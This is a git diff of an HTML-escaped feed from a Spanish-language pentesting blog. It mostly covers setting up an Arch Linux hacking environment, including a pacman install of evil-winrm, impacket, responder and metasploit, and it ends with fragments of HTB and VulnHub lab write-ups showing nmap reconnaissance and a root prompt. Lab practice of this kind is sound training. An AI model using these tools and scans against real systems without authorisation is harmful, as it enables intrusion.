+  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;# The list of segments shown on the right. Fill it with less important segments.&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# Right prompt on the last prompt line (where you are typing your commands) gets&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# automatically hidden when the input line reaches it. Right prompt above the&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# last prompt line gets hidden if it would overlap with left prompt.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;POWERLEVEL9K_RIGHT_PROMPT_ELEMENTS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=(&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# status                  # exit code of the last command&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# command_execution_time  # duration of the last command&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# background_jobs         # presence of background jobs&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# direnv                  # direnv status (https://direnv.net/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# asdf                    # asdf version manager (https://github.com/asdf-vm/asdf)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# virtualenv              # python virtual environment (https://docs.python.org/3/library/venv.html)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# anaconda                # conda environment (https://conda.io/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# pyenv                   # python environment (https://github.com/pyenv/pyenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# goenv                   # go environment (https://github.com/syndbg/goenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nodenv                  # node.js version from nodenv (https://github.com/nodenv/nodenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nvm                     # node.js version from nvm (https://github.com/nvm-sh/nvm)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nodeenv                 # node.js environment (https://github.com/ekalinin/nodeenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# node_version          # node.js version&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# go_version            # go version (https://golang.org)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# rust_version          # rustc version (https://www.rust-lang.org)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# dotnet_version        # .NET version (https://dotnet.microsoft.com)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# php_version           # php version (https://www.php.net/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# laravel_version       # laravel php framework version (https://laravel.com/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# java_version          # java version (https://www.java.com/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# package               # name@version from package.json (https://docs.npmjs.com/files/package.json)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# rbenv                   # ruby version from rbenv (https://github.com/rbenv/rbenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# rvm                     # ruby version from rvm (https://rvm.io)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# fvm                     # flutter version management (https://github.com/leoafarias/fvm)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# luaenv                  # lua version from luaenv (https://github.com/cehoffman/luaenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# jenv                    # java version from jenv (https://github.com/jenv/jenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# plenv                   # perl version from plenv (https://github.com/tokuhirom/plenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# perlbrew                # perl version from perlbrew (https://github.com/gugod/App-perlbrew)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# phpenv                  # php version from phpenv (https://github.com/phpenv/phpenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# scalaenv                # scala version from scalaenv (https://github.com/scalaenv/scalaenv)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# haskell_stack           # haskell version from stack (https://haskellstack.org/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# kubecontext             # current kubernetes context (https://kubernetes.io/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# terraform               # terraform workspace (https://www.terraform.io)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# terraform_version     # terraform version (https://www.terraform.io)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# aws                     # aws profile (https://docs.aws.amazon.com/cli/latest/userguide/cli-configu&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# aws_eb_env              # aws elastic beanstalk environment (https://aws.amazon.com/elasticbeanstal&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# azure                   # azure account name (https://docs.microsoft.com/en-us/cli/azure)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# gcloud                  # google cloud cli account and project (https://cloud.google.com/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# google_app_cred         # google application credentials (https://cloud.google.com/docs/authenticat&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# toolbox                 # toolbox name (https://github.com/containers/toolbox)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# context                 # user@hostname&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nordvpn                 # nordvpn connection status, linux only (https://nordvpn.com/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# ranger                  # ranger shell (https://github.com/ranger/ranger)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nnn                     # nnn shell (https://github.com/jarun/nnn)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# xplr                    # xplr shell (https://github.com/sayanarijit/xplr)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# vim_shell               # vim shell indicator (:sh)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# midnight_commander      # midnight commander shell (https://midnight-commander.org/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# nix_shell               # nix shell (https://nixos.org/nixos/nix-pills/developing-with-nix-shell.ht&amp;gt;&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# vi_mode                 # vi mode (you don't need this if you've enabled prompt_char)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# vpn_ip                # virtual private network indicator&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# load                  # CPU load&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# disk_usage            # disk usage&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# ram                   # free RAM&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# swap                  # used swap&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# todo                    # todo items (https://github.com/todotxt/todo.txt-cli)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# timewarrior             # timewarrior tracking status (https://timewarrior.net/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# taskwarrior             # taskwarrior task count (https://taskwarrior.org/)&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# time                  # current time&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# ip                    # ip address and bandwidth usage for a specified network interface&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# public_ip             # public IP address&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# proxy                 # system-wide http/https/ftp proxy&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# battery               # internal battery&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# wifi                  # wifi speed&lt;/span&gt;
+    &lt;span class=&quot;c&quot;&gt;# example               # example user-defined segment (see prompt_example function below)&lt;/span&gt;
+  &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para el usuario &lt;strong&gt;root&lt;/strong&gt; modificaremos lo mismo que el usuario no privilegiado, y también modificaremos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Context format when running with privileges: bold user@hostname.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;POWERLEVEL9K_CONTEXT_ROOT_TEMPLATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;' ^~^`'&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# Context format when in SSH without privileges: user@hostname.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; POWERLEVEL9K_CONTEXT_&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;REMOTE,REMOTE_SUDO&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;_TEMPLATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%n@%m'&lt;/span&gt;
+  &lt;span class=&quot;c&quot;&gt;# Default context format (no privileges, no SSH): user@hostname.&lt;/span&gt;
+  &lt;span class=&quot;nb&quot;&gt;typeset&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-g&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;POWERLEVEL9K_CONTEXT_TEMPLATE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%n@%m'&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;En caso de que cuando migremos al usuario &lt;strong&gt;root&lt;/strong&gt; nos aparezca la configuración de la &lt;strong&gt;powerlevel10k&lt;/strong&gt;, cancelamos dicha configuración, si tenemos la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;powerlevel10k&lt;/code&gt; en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/root&lt;/code&gt; la borramos y ejecutamos los comandos siguientes:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone &lt;span class=&quot;nt&quot;&gt;--depth&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 https://github.com/romkatv/powerlevel10k.git ~/powerlevel10k
+p10k configure
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;instalación-fzf&quot;&gt;Instalación FZF&lt;/h3&gt;
+
+&lt;p&gt;Ahora instalaremos la &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fzf&lt;/code&gt; de acuerdo a lo que nos indica el repositorio &lt;a href=&quot;https://github.com/junegunn/fzf&quot;&gt;fzf&lt;/a&gt;; tanto para el usuario no privilegiado como &lt;strong&gt;root&lt;/strong&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd
+&lt;/span&gt;git clone &lt;span class=&quot;nt&quot;&gt;--depth&lt;/span&gt; 1 https://github.com/junegunn/fzf.git ~/.fzf
+~/.fzf/install
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;neovim&quot;&gt;NeoVim&lt;/h3&gt;
+
+&lt;p&gt;Para instalar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;neovim&lt;/code&gt;, ejecutaremos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; neovim
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Y ahora lo complementaremos &lt;strong&gt;NvChad&lt;/strong&gt; del repositorio &lt;a href=&quot;https://github.com/NvChad/NvChad&quot;&gt;NvChad&lt;/a&gt;. Para instalarlo, los dirigiremos al recurso &lt;a href=&quot;https://nvchad.github.io/getting-started/setup&quot;&gt;nvchad.github.io&lt;/a&gt; y seguiremos los pasos que nos indican como un usuario no privilegiado:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd
+&lt;/span&gt;git clone https://github.com/NvChad/NvChad ~/.config/nvim &lt;span class=&quot;nt&quot;&gt;--depth&lt;/span&gt; 1
+nvim +&lt;span class=&quot;s1&quot;&gt;'hi NormalFloat guibg=#1e222a'&lt;/span&gt; +PackerSync
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Para abrir cualquier archivo utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nvim&lt;/code&gt; y para que nos muestre archivos que forma bonita, utilizaremos el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;NvimTreeToggle&lt;/code&gt;:&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/entorno_arch/arch6.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Recordar que tenemos que hace lo mismo para el usuario &lt;strong&gt;root&lt;/strong&gt;:&lt;/p&gt;
+
+&lt;h3 id=&quot;icono-awesome&quot;&gt;Icono Awesome&lt;/h3&gt;
+
+&lt;p&gt;Si queremos cambiar el icono de &lt;strong&gt;Awesome&lt;/strong&gt; en la barra lateral izquierda, nos dirigimos a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/theme/assets/icons&lt;/code&gt; y cambiamos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;awesome.png&lt;/code&gt; por uno que nosotros queramos. Lo podemos visualizar con el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;kitty +kitten icat awesome.png&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;shortcuts&quot;&gt;ShortCuts&lt;/h3&gt;
+
+&lt;p&gt;Para agregar shortcuts y poder personalizar las aplicaciones que abramos, vamos a retocar algunos archivos de configuración de &lt;strong&gt;Awesome&lt;/strong&gt;. Vamos a empezar primero con modificar las teclas para Firefox; por lo que nos abrimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/configuration/keys.lua&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		awful.key&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;modkey,&lt;span class=&quot;s2&quot;&gt;&quot;Shift&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;f&quot;&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+            awful.spawn.with_shell&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;browser&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        end,
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;description &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;open web browser&quot;&lt;/span&gt;, group &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;launcher&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora nos descargamos el BurpSuite con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S burpsuite&lt;/code&gt; y vamos a asignarle una combinación de teclas para poder abrirlo. Por lo que primero creamos la variable en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/rc.lua&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; Defalt Applications
+terminal &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;kitty&quot;&lt;/span&gt;
+...
+browser &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;firefox&quot;&lt;/span&gt;
+proxy_burp &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;burpsuite&quot;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--La&lt;/span&gt; linea que agregamos para burpsuite
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora agregamos la ejecución en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/configuration/keys.lua&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;		awful.key&lt;span class=&quot;o&quot;&gt;({&lt;/span&gt;modkey,&lt;span class=&quot;s2&quot;&gt;&quot;Shift&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;, &lt;span class=&quot;s2&quot;&gt;&quot;b&quot;&lt;/span&gt;, &lt;span class=&quot;k&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt;
+            awful.spawn.with_shell&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;proxy_burp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+        end,
+        &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;description &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;open burpsuite&quot;&lt;/span&gt;, group &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;launcher&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;})&lt;/span&gt;,
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Si aplicamos los cambios de la configuración con &lt;strong&gt;Ctrl + Windows + r&lt;/strong&gt;, vemos que podemos hacer &lt;strong&gt;Windows + Shift + b&lt;/strong&gt; para abrir el BurpSuite. Cualquier otro programa que necesitemos un shortcut, podemos configurarlo de esta manera.&lt;/p&gt;
+
+&lt;h3 id=&quot;instalación-de-herramienta-de-pentesting&quot;&gt;Instalación de herramienta de pentesting&lt;/h3&gt;
+
+&lt;p&gt;Vamos a instalarnos algunas herramientas que nos puedan ayudar para realizar pentesting:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; evil-winrm python-pip impacket responder nmap whatweb wfuzz gobuster
+&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;pacman &lt;span class=&quot;nt&quot;&gt;-S&lt;/span&gt; metasploit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;detalles-de-teclas&quot;&gt;Detalles de teclas&lt;/h3&gt;
+
+&lt;p&gt;Tenemos una teclas que no nos funcionan como el &lt;strong&gt;HOME&lt;/strong&gt;, &lt;strong&gt;END&lt;/strong&gt; y &lt;strong&gt;DEL&lt;/strong&gt;; por lo tanto, abrimos el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.zshrc&lt;/code&gt; como un usuario no privilegiado y agregamos lo siguiente:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bindkey &lt;span class=&quot;s2&quot;&gt;&quot;^[[H&quot;&lt;/span&gt; beginning-of-line
+bindkey &lt;span class=&quot;s2&quot;&gt;&quot;^[[F&quot;&lt;/span&gt; end-of-line
+bindkey &lt;span class=&quot;s2&quot;&gt;&quot;^[[3~&quot;&lt;/span&gt; delete-char
+bindkey &lt;span class=&quot;s2&quot;&gt;&quot;^[[1;3C&quot;&lt;/span&gt; forward-word 
+bindkey &lt;span class=&quot;s2&quot;&gt;&quot;^[[1;3D&quot;&lt;/span&gt; backward-word
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;instalación-de-mdcat&quot;&gt;Instalación de mdcat&lt;/h3&gt;
+
+&lt;p&gt;Utilizando el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo pacman -S mdcat&lt;/code&gt; para que veamos de forma presentable los archivos de extensión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;md&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;copypaste-vmware&quot;&gt;Copy/Paste VMware&lt;/h3&gt;
+
+&lt;p&gt;En caso de que necesitemos la funcionalidad de &lt;strong&gt;Copy and Paste&lt;/strong&gt; sobre WMware, necesitamos agregar las siguientes lineas en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;~/.config/awesome/rc.lua&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt; VMware
+awful.util.spawn_with_shell&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;vmware-user-suid-wrapper --no--startup-id&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>K4miyo</name></author><category term="ArchLinux" /><category term="Configuration" /><category term="ZSH" /><category term="Kitty" /><category term="AwesomeWM" /><category term="AUR" /><category term="BlackArch" /><category term="locate" /><category term="lsd" /><category term="bat" /><category term="scrub" /><category term="NeoVim" /><category term="NerdFonts" /><category term="Copy/Paste_VMware" /><summary type="html">Configuración de entorno de hacking en Arch Linux</summary></entry><entry><title type="html">VulnHub BrainPan 1</title><link href="http://localhost:4000/vh-brainpan1/" rel="alternate" type="text/html" title="VulnHub BrainPan 1" /><published>2022-04-04T00:00:00-05:00</published><updated>2022-04-04T00:00:00-05:00</updated><id>http://localhost:4000/vh-brainpan1</id><content type="html" xml:base="http://localhost:4000/vh-brainpan1/">&lt;p&gt;&lt;img src=&quot;/assets/images/vh-brainpan1/banner-brainpan1.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
 
 &lt;h2 id=&quot;brainpan-1&quot;&gt;BrainPan 1&lt;/h2&gt;
 &lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.0.0.32 (la cual obtenemos al ejecutar el comando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;netdiscover&lt;/code&gt;).&lt;/p&gt;
@@ -4550,121 +5170,4 @@ root@Nibbles:/home/nibbler/personal/stuff# &lt;span class=&quot;nb&quot;&gt;whoa
 root@Nibbles:/home/nibbler/personal/stuff#
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;Ya somos el usuario &lt;strong&gt;root&lt;/strong&gt; y podemos visualizar al flag (root.txt).&lt;/p&gt;</content><author><name>K4miyo</name></author><category term="File_Misconfiguration" /><summary type="html">Resolución de la máquina Nibbles en la plataforma de Hack The Box</summary></entry><entry><title type="html">Hack The Box Jerry</title><link href="http://localhost:4000/htb-jerry/" rel="alternate" type="text/html" title="Hack The Box Jerry" /><published>2022-03-15T00:00:00-06:00</published><updated>2022-03-15T00:00:00-06:00</updated><id>http://localhost:4000/htb-jerry</id><content type="html" xml:base="http://localhost:4000/htb-jerry/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-jerry/banner-jerry.jpg&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;h2 id=&quot;jerry&quot;&gt;Jerry&lt;/h2&gt;
-&lt;p&gt;Se procede con la fase de reconocimiento lanzando primeramente un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ping&lt;/code&gt; a la dirección IP 10.10.10.95.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ ping &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; 1 10.10.10.95
-PING 10.10.10.95 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;10.10.10.95&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.
-64 bytes from 10.10.10.95: &lt;span class=&quot;nv&quot;&gt;icmp_seq&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 &lt;span class=&quot;nv&quot;&gt;ttl&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127 &lt;span class=&quot;nb&quot;&gt;time&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;138 ms
-
-&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; 10.10.10.95 ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
-1 packets transmitted, 1 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;0ms
-rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 137.931/137.931/137.931/0.000 ms
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nmap&lt;/code&gt; para determinar los puertos abiertos de la máquina y exportanto la información al archivo &lt;strong&gt;allPorts&lt;/strong&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
-Host discovery disabled &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; All addresses will be marked &lt;span class=&quot;s1&quot;&gt;'up'&lt;/span&gt; and scan &lt;span class=&quot;nb&quot;&gt;times &lt;/span&gt;may be slower.
-Starting Nmap 7.92 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2022-03-13 21:14 CST
-Initiating SYN Stealth Scan at 21:14
-Scanning 10.10.10.95 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;65535 ports]
